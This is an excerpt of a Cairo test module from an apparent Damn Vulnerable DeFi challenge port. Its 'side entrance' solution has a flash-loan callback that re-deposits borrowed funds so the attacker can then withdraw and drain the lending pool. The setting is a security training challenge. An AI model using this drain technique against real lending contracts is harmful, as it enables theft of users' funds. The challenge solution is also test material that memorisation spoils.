...
mod test_side_entrance_lender_pool {
    ...
    use damnvulnerabledefi::contracts::challenges::side_entrance::side_entrance_lender_pool::{
        side_entrance_lender_pool, ISideEntranceLenderPoolDispatcher,
        ISideEntranceLenderPoolDispatcherTrait, IFlashLoanEtherReceiver,
    };
    ...
    mod player {
        ...
        use damnvulnerabledefi::tests::utils::helpers::to_wad;
        ...
        #[constructor]
        fn constructor(ref self: ContractState, side_pool: ISideEntranceLenderPoolDispatcher) {
        ...
        impl FlashLoanReceiver of super::IFlashLoanEtherReceiver<ContractState> {
            fn execute(self: @ContractState, token: IERC20Dispatcher, amount: u256) {
                self.side_pool.read().deposit(to_wad(1000));
            }
        }
    ...
    fn exploit() {
        ...
        let address_player = __setup_player(side_pool);
        ...
        call_contracts_as(address_player);
        ether_token.increase_allowance(side_pool.contract_address, to_wad(1000));
        side_pool.flash_loan(to_wad(1000));
        side_pool.withdraw();
    ...
    fn __setup_player(side_pool: ISideEntranceLenderPoolDispatcher) -> ContractAddress {
        ////////////////////////////////////
